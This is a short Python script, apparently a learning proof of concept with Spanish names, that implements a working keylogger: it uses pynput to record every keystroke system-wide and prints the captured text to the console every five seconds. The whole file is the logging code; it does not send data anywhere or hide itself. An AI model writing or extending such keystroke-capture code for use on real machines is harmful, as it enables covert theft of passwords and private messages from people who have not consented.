import pynput.keyboard
import threading
import signal, sys
def saliendo(sig, frame):
    print("\n\nSaliendo...\n")
    sys.exit(1)
#CTRL + C
signal.signal(signal.SIGINT, saliendo)

eventos= ''

class MiKeyLoggerProof():

    def __init__(self):
        self.iniciar()

    
    def registroteclas(self, tecla):

        global eventos

        try:
            eventos += str(tecla.char)
        except:
            if tecla == pynput.keyboard.Key.space:
                eventos += " "
            else:
                eventos +=" " + str(tecla) + " "

    def reporte(self):
        global eventos

        print(eventos)

        eventos = ""

        reporte = threading.Timer(5, self.reporte)

        reporte.start()
        
    def iniciar(self):
        detector_teclas = pynput.keyboard.Listener(on_press=self.registroteclas)

        with detector_teclas:
            self.reporte()
            detector_teclas.join()

if __name__ == "__main__":    
    keylogger = MiKeyLoggerProof()
